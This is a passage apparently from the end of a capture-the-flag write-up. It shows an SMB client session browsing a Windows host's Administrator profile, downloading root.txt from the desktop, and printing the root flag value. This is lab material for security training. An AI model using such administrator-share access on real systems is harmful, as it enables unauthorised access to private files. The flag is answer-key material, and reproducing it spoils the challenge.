  .                                  DR        0  Fri Jul  5 08:48:22 2024
  ..                                DHS        0  Thu Mar  5 17:29:03 2026
  admin                               D        0  Fri Jul  5 08:49:01 2024
  Administrator                       D        0  Thu Mar  5 15:17:45 2026
  All Users                       DHSrn        0  Sat May  8 18:26:16 2021
  Default                           DHR        0  Sun Jun 16 12:51:08 2024
  Default User                    DHSrn        0  Sat May  8 18:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 18:14:03 2021
  Public                             DR        0  Sun Jun 16 03:54:32 2024
  ybob317                             D        0  Tue Jun 18 03:24:32 2024

		12942591 blocks of size 4096. 10801783 blocks available
smb: \Users\> cd Administrator
smb: \Users\Administrator\> ls
  .                                   D        0  Thu Mar  5 15:17:45 2026
  ..                                 DR        0  Fri Jul  5 08:48:22 2024
  3D Objects                         DR        0  Sun Jun 16 03:54:32 2024
  AppData                            DH        0  Sun Jun 16 03:54:27 2024
  Application Data                DHSrn        0  Sun Jun 16 03:54:27 2024
  Contacts                           DR        0  Sun Jun 16 03:54:32 2024
  Cookies                         DHSrn        0  Sun Jun 16 03:54:27 2024
  Desktop                            DR        0  Sat Jul 26 03:51:20 2025
  Documents                          DR        0  Thu Jun 19 07:38:23 2025
  Downloads                          DR        0  Sun Jun 16 03:54:33 2024
  Favorites                          DR        0  Sun Jun 16 03:54:32 2024
  Links                              DR        0  Sun Jun 16 03:54:33 2024
  Local Settings                  DHSrn        0  Sun Jun 16 03:54:27 2024
  Music                              DR        0  Sun Jun 16 03:54:33 2024
  My Documents                    DHSrn        0  Sun Jun 16 03:54:27 2024
  NetHood                         DHSrn        0  Sun Jun 16 03:54:27 2024
  NTUSER.DAT                        AHn   262144  Thu Mar  5 15:38:11 2026
  ntuser.dat.LOG1                   AHS    49152  Sun Jun 16 03:54:27 2024
  ntuser.dat.LOG2                   AHS        0  Sun Jun 16 03:54:27 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TM.blf    AHS    65536  Sun Jun 16 03:54:28 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Jun 16 03:54:27 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Jun 16 03:54:27 2024
  ntuser.ini                         HS       20  Sun Jun 16 03:54:27 2024
  Pictures                           DR        0  Sun Jun 16 03:54:32 2024
  Recent                          DHSrn        0  Sun Jun 16 03:54:27 2024
  Saved Games                        DR        0  Sun Jun 16 03:54:33 2024
  Searches                           DR        0  Sun Jun 16 03:54:33 2024
  SendTo                          DHSrn        0  Sun Jun 16 03:54:27 2024
  Start Menu                      DHSrn        0  Sun Jun 16 03:54:27 2024
  Templates                       DHSrn        0  Sun Jun 16 03:54:27 2024
  Videos                             DR        0  Sun Jun 16 03:54:32 2024

		12942591 blocks of size 4096. 10801783 blocks available
smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Sat Jul 26 03:51:20 2025
  ..                                  D        0  Thu Mar  5 15:17:45 2026
  backup                              D        0  Tue Jun 18 03:41:17 2024
  desktop.ini                       AHS      282  Sun Jun 16 03:54:32 2024
  root.txt                            A       33  Sat Jul 26 03:51:20 2025
c
		12942591 blocks of size 4096. 10801783 blocks available
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 33 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

# Root Flag
```
$cat root.txt 
27cb2be302c388d63d27c86bfdd5f56a
```